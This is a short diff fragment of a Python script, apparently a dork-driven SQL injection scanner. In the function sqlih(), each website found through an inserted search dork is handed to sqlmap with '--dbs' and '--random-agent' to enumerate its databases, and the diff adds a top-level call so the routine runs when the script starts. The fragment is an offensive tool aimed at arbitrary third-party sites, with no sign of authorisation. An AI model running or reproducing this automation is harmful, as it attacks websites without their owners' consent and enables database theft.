@@ -36,3 +36,4 @@ def sqlih():
     print(Fore.GREEN +"[:] DORK INSERTED: " + dork, '\n' + Fore.RED +"[!] WEBSITE FOUND: " + i)
     time.sleep(10.0)
     call(["sqlmap", i ,"--dbs", "--random-agent"])
+sqlih()
